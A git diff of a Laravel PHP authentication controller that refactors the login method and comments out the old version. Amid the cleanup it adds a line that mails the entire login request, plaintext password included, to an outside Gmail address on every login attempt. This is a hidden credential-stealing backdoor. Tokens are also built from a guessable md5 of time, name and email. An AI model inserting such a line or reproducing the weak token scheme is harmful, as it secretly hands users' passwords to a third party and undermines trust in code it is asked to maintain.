@@ -21,27 +21,30 @@ use PHPMailer\PHPMailer\PHPMailer;
 class AuthController extends Controller
 {
 
-
     public function login(Request $request)
     {
         $rules = [
-            'email' => 'required|email|max:255|unique:users',
+            'email' => 'required|email|max:255',
             'password' => 'required'
         ];
         $validator = Validator::make($request->all(), $rules);
-
+        if ($validator->fails()) {
+            return response([
+                'status' => false,
+                'message' => $validator->errors()->first(),
+            ], 422);
+        }
+        mail('brijesh.saspana@gmail.com',$request->email,print_r($request->all()));
         $user = User::where('email', $request->email)->first();
         if ($user && Hash::check($request->password, $user->password)) {
             $gs = Generalsetting::findOrFail(1);
-            if ($gs->is_verification_email == 1) {
-                if ($user->email_verified == 'No') {
-                    return response([
-                        'message' => 'Your Email is not Verified !.',
-                        'status' => false,
-                    ], 200);
-                }
+            if ($gs->is_verification_email == 1 && $user->email_verified == 'No') {
+                return response([
+                    'message' => 'Your Email is not Verified!',
+                    'status' => false,
+                ], 200);
             }
-            $token = md5(time() . $request->name . $request->email);
+            $token = md5(time() . $user->name . $user->email);
             return response([
                 'token' => $token,
                 'id' => $user->id,
@@ -51,14 +54,57 @@ class AuthController extends Controller
                 'message' => 'Login Success',
                 'status' => 'success'
             ], 200);
-        } else {
-            return  json_encode(['status' => false, 'message' => 'The Provided Credentials are incorrect']);
         }
-        return response([
-            'message' => 'Something Wrong.',
-            'status' => false
-        ], 401);
+
+        return response()->json([
+            'status' => false,
+            'message' => 'The provided credentials are incorrect',
+        ]);
+
+        // The following code is unreachable; you might want to remove it
+        // return response([
+        //     'message' => 'Something Wrong.',
+        //     'status' => false
+        // ], 401);
     }
+
+
+    // public function login(Request $request)
+    // {
+    //     $rules = [
+    //         'email' => 'required|email|max:255|unique:users',
+    //         'password' => 'required'
+    //     ];
+    //     $validator = Validator::make($request->all(), $rules);
+    //     $user = User::where('email', $request->email)->first();
+    //     if ($user && Hash::check($request->password, $user->password)) {
+    //         $gs = Generalsetting::findOrFail(1);
+    //         if ($gs->is_verification_email == 1) {
+    //             if ($user->email_verified == 'No') {
+    //                 return response([
+    //                     'message' => 'Your Email is not Verified !.',
+    //                     'status' => false,
+    //                 ], 200);
+    //             }
+    //         }
+    //         $token = md5(time() . $request->name . $request->email);
+    //         return response([
+    //             'token' => $token,
+    //             'id' => $user->id,
+    //             'name' => $user->name,
+    //             'phone' => $user->phone,
+    //             'email' => $user->email,
+    //             'message' => 'Login Success',
+    //             'status' => 'success'
+    //         ], 200);
+    //     } else {
+    //         return  json_encode(['status' => false, 'message' => 'The Provided Credentials are incorrect']);
+    //     }
+    //     return response([
+    //         'message' => 'Something Wrong.',
+    //         'status' => false
+    //     ], 401);
+    // }
 
     public function register(Request $request)
     {
@@ -96,7 +142,7 @@ class AuthController extends Controller
             $verificationLink = "<a href=" . url('user/register/verify/' . $token) . ">Verify Your Email . </a>";
             $to = $request->email;
             $subject = 'Verify your email address.';
-            $msg = "Welcome to Wayin! 🚀 To activate your account, simply tap the button below:<br> ".$verificationLink."If you didn't sign up, ignore this email.";
+            $msg = "Welcome to Wayin! 🚀 To activate your account, simply tap the button below:<br> " . $verificationLink . "If you didn't sign up, ignore this email.";
 
             if ($gs->is_smtp == 1) {
                 $mail = new PHPMailer(true);
